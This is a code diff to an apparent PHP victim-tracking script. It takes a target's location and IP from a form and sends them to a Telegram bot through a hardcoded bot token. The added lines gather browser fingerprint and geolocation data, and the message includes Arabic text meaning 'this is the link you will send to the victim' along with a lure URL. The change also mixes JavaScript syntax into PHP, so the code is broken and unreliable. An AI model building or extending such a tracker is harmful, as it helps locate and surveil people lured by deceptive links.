@@ -8,8 +8,27 @@ if(isset($_POST['location']) && isset($_POST['ip'])) {
     $bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     $telegram_api_url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
 
-// Set up the message to send to the Telegram bot
-    $message = "Location: $location\nIP: $ip\n\nهذا هو الرابط الي هتبعته للضحيه:\nhttps://sexylady2023.blogspot.com";
+    // Get the user's IP address and additional information
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
+
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
+    const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property
+    const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property
+    const vendor = navigator.vendor;
+    const isAndroid = userAgent.toLowerCase().includes('android');
+
+    const ipInfo = await getIPInfo(ipAddress);
+    const country = ipInfo.country_name || 'N/A';
+    const city = ipInfo.city || 'N/A';
+    const isp = ipInfo.org || 'N/A';
+
+    // Set up the message to send to the Telegram bot with the additional information
+    $message = "Location: $location\nIP: $ip\n\nIP Address: $ipAddress\nUser Agent: $userAgent\nPlatform: $platform\nScreen Width: $screenWidth\nScreen Height: $screenHeight\nCPU Cores: $cpuCores\nTotal RAM: $totalRAM\nVendor: $vendor\nIs Android: $isAndroid\nCountry: $country\nCity: $city\nISP: $isp\n\nهذا هو الرابط الي هتبعته للضحيه:\nhttps://sexylady2023.blogspot.com";
     
     // Set up the inline keyboard with buttons
     $keyboard = array(
@@ -52,7 +71,5 @@ if(isset($_POST['location']) && isset($_POST['ip'])) {
     // Echo an error message if the location or IP data wasn't received
     echo 'Location data not received';
 }
-
-
 
 ?>
